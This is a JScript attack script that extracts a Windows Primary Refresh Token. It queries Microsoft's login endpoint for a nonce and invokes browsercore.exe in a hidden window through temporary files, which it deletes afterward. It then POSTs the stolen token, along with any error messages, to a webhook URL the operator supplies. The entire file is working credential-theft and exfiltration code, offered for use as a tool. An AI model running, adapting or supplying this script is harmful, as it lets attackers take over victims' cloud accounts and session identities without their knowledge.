// JScript implementation of PRT token extraction
// Usage: cscript //Nologo Get-UserPRTToken.js <webhook_url> [--allow-http]

var webhookUrl = WScript.Arguments.length > 0 ? WScript.Arguments(0) : "";
if (!webhookUrl) {
    WScript.Echo("[!] Usage: cscript //Nologo Get-UserPRTToken.js <webhook_url> [--allow-http]");
    WScript.Quit(1);
}

// Check for --allow-http flag
var allowHttp = false;
if (WScript.Arguments.length > 1 && WScript.Arguments(1).toLowerCase() === "--allow-http") {
    allowHttp = true;
}

// Validate HTTPS for secure transmission of PRT token (unless --allow-http)
if (webhookUrl.toLowerCase().indexOf("https://") !== 0) {
    if (allowHttp) {
        WScript.Echo("[!] WARNING: Using HTTP - token will be sent unencrypted!");
    } else {
        WScript.Echo("[!] ERROR: Webhook URL must use HTTPS for secure token transmission");
        WScript.Echo("[!] Provided URL: " + webhookUrl);
        WScript.Echo("[!] Use --allow-http flag to bypass (insecure, for local testing only)");
        WScript.Quit(1);
    }
}

try {
    // Step 1: Get nonce from Microsoft
    WScript.Echo("[*] Requesting nonce...");
    var http = new ActiveXObject("MSXML2.XMLHTTP");
    http.open("POST", "https://login.microsoftonline.com/Common/oauth2/token", false);
    http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    http.send("grant_type=srv_challenge");

    if (http.status !== 200) {
        throw new Error("Failed to get nonce: HTTP " + http.status);
    }

    var nonceResp = JSON.parse(http.responseText);
    var nonce = nonceResp.Nonce;
    if (!nonce) {
        throw new Error("No nonce in response");
    }
    WScript.Echo("[+] Nonce obtained: " + nonce.substring(0, 20) + "...");

    // Step 2: Locate browsercore.exe
    WScript.Echo("[*] Locating browsercore.exe...");
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var shell = new ActiveXObject("WScript.Shell");
    var programFiles = shell.ExpandEnvironmentStrings("%ProgramFiles%");
    var windir = shell.ExpandEnvironmentStrings("%windir%");

    var locations = [
        programFiles + "\\Windows Security\\BrowserCore\\browsercore.exe",
        windir + "\\BrowserCore\\browsercore.exe"
    ];

    var browserCore = null;
    for (var i = 0; i < locations.length; i++) {
        if (fso.FileExists(locations[i])) {
            browserCore = locations[i];
            break;
        }
    }

    if (!browserCore) {
        throw new Error("browsercore.exe not found in standard locations");
    }
    WScript.Echo("[+] Found: " + browserCore);

    // Step 3: Prepare JSON request
    var jsonRequest = {
        "method": "GetCookies",
        "uri": "https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=" + nonce,
        "sender": "https://login.microsoftonline.com"
    };
    var jsonStr = JSON.stringify(jsonRequest);

    // Step 4: Create temporary input file with length-prefixed JSON
    // (JScript can't easily write binary to stdin, so we use a workaround with file redirection)
    WScript.Echo("[*] Preparing BrowserCore request...");
    var tempPath = shell.ExpandEnvironmentStrings("%TEMP%");
    var inputFile = tempPath + "\\prt_input_" + Math.floor(Math.random() * 100000) + ".bin";
    var outputFile = tempPath + "\\prt_output_" + Math.floor(Math.random() * 100000) + ".txt";

    // Write 4-byte length prefix + JSON using ADODB.Stream
    var stream = new ActiveXObject("ADODB.Stream");
    stream.Type = 1; // Binary
    stream.Open();

    // Write 4-byte little-endian length
    var length = getUTF8ByteLength(jsonStr);
    stream.Write(createLengthPrefix(length));

    // Write UTF-8 JSON
    var textStream = new ActiveXObject("ADODB.Stream");
    textStream.Type = 2; // Text
    textStream.Charset = "UTF-8";
    textStream.Open();
    textStream.WriteText(jsonStr);
    textStream.Position = 0;
    textStream.Type = 1; // Convert to binary
    textStream.CopyTo(stream);
    textStream.Close();

    stream.SaveToFile(inputFile, 2); // Overwrite
    stream.Close();

    // Step 5: Execute browsercore.exe with redirected I/O
    WScript.Echo("[*] Executing browsercore.exe...");
    var cmd = 'cmd /c "' + browserCore + '" < "' + inputFile + '" > "' + outputFile + '"';
    var result = shell.Run(cmd, 0, true); // Hidden window, wait for completion

    // Step 6: Read output
    if (!fso.FileExists(outputFile)) {
        throw new Error("browsercore.exe produced no output");
    }

    var fileStream = fso.OpenTextFile(outputFile, 1); // Read
    var rawOutput = fileStream.ReadAll();
    fileStream.Close();

    // Cleanup temp files
    try { fso.DeleteFile(inputFile); } catch(e) {}
    try { fso.DeleteFile(outputFile); } catch(e) {}

    // Step 7: Parse JSON response
    WScript.Echo("[*] Parsing response...");
    var jsonStart = rawOutput.indexOf("{");
    if (jsonStart < 0) {
        throw new Error("No JSON found in browsercore.exe output");
    }

    var jsonResponse = rawOutput.substring(jsonStart);
    var parsed = JSON.parse(jsonResponse);

    if (parsed.status === "Fail") {
        throw new Error("PRT retrieval failed: " + parsed.code + " - " + parsed.description);
    }

    var prtToken = parsed.response.data;
    WScript.Echo("[+] PRT successfully extracted!");

    // Step 8: Send to webhook
    WScript.Echo("[*] Sending to webhook...");
    var httpPost = new ActiveXObject("MSXML2.XMLHTTP");
    httpPost.open("POST", webhookUrl, false);
    httpPost.setRequestHeader("Content-Type", "text/plain");
    httpPost.send(prtToken);

    if (httpPost.status >= 200 && httpPost.status < 300) {
        WScript.Echo("[+] Successfully sent to webhook!");
    } else {
        WScript.Echo("[!] Webhook returned HTTP " + httpPost.status);
    }

    WScript.Echo("\n[+] PRT Token:");
    WScript.Echo(prtToken);

} catch (e) {
    WScript.Echo("[!] Error: " + e.message);

    // Try to send error to webhook
    try {
        var httpErr = new ActiveXObject("MSXML2.XMLHTTP");
        httpErr.open("POST", webhookUrl, false);
        httpErr.setRequestHeader("Content-Type", "text/plain");
        httpErr.send("[ERROR] " + e.message);
    } catch(e2) {}

    WScript.Quit(1);
}

// Helper function: Get UTF-8 byte length
function getUTF8ByteLength(str) {
    var len = 0;
    for (var i = 0; i < str.length; i++) {
        var code = str.charCodeAt(i);
        if (code < 0x80) len += 1;
        else if (code < 0x800) len += 2;
        else if (code < 0x10000) len += 3;
        else len += 4;
    }
    return len;
}

// Helper function: Create 4-byte little-endian length prefix
function createLengthPrefix(length) {
    var arr = new ActiveXObject("System.Collections.ArrayList");
    arr.Add(length & 0xFF);
    arr.Add((length >> 8) & 0xFF);
    arr.Add((length >> 16) & 0xFF);
    arr.Add((length >> 24) & 0xFF);

    // Convert to VT_ARRAY | VT_UI1
    var result = new ActiveXObject("ADODB.Stream");
    result.Type = 1; // Binary
    result.Open();
    for (var i = 0; i < 4; i++) {
        result.Write(createByte(arr.Item(i)));
    }
    result.Position = 0;
    var bytes = result.Read();
    result.Close();
    return bytes;
}

// Helper function: Create single byte
function createByte(val) {
    var stream = new ActiveXObject("ADODB.Stream");
    stream.Type = 1; // Binary
    stream.Open();
    stream.Write(new ActiveXObject("System.Text.ASCIIEncoding").GetBytes(String.fromCharCode(val)));
    stream.Position = 0;
    var result = stream.Read(1);
    stream.Close();
    return result;
}
